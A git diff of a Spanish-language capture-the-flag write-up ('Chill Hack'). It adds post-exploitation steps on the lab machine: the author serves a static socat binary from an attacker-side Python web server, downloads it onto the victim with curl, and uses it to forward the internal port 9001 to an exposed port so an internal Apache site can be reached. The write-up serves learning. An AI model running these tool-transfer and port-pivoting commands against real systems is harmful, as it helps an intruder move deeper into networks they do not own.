@@ -269,7 +269,7 @@ Enunciado :
                 Password: 
                 su: Authentication failure
 
-          -  Cuando mostramos las conexiones activas habia otros puertos, los revisamos y vemos que esta corriendo un servicio http localmente.
+          -  Cuando mostramos las conexiones activas habia otros puertos, los revisamos y vemos que esta corriendo un servicio http localmente el el puerto 9001
 
               ![image](https://github.com/Esevka/CTF/assets/139042999/52a4643a-072e-49b0-8112-1568c4e6a0f8)
 
@@ -294,10 +294,33 @@ Enunciado :
                   <address>Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 9001</address>
                   </body></html>
              
-          - redireccionamos el pueto con socat
+          - Redireccionamos el puerto 9001 que esta corriento un servicio http local para poder visualizar la web desde nuestro navegador(Remote Port Forwarding)
+      
+            Subimos socat a la maquina victima
 
-               
+            [+]Socat--> https://github.com/andrew-d/static-binaries/tree/master/binaries/linux
 
+            Montamos servidor web con python
+                
+                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
+                └─# python3 -m http.server 80
+                Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+                10.10.134.121 - - [09/Dec/2023 10:09:45] "GET /socat HTTP/1.1" 200 -
+
+            Descargamos Socat en la maquina victima y le damos permiso de ejecucion.
+
+                www-data@ubuntu:/tmp$ curl http://10.9.92.151/socat -o socat
+                 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                                 Dload  Upload   Total   Spent    Left  Speed
+                100  366k  100  366k    0     0   564k      0 --:--:-- --:--:-- --:--:--  564k
+                
+            Redireccionamos el puerto local 9001 al puerto remoto 8080
+
+                www-data@ubuntu:/tmp$ ./socat tcp-l:8080,fork,reuseaddr tcp:localhost:9001
+
+            ![image](https://github.com/Esevka/CTF/assets/139042999/355e908d-1016-4b2a-b637-672b59f6ee5e)
+
+  
     3) hacker.php --> Encontramos estos dos mensajes que no sabemos muy bien a que se refieren.
 
             style="background-color:red;">You have reached this far. </h2>
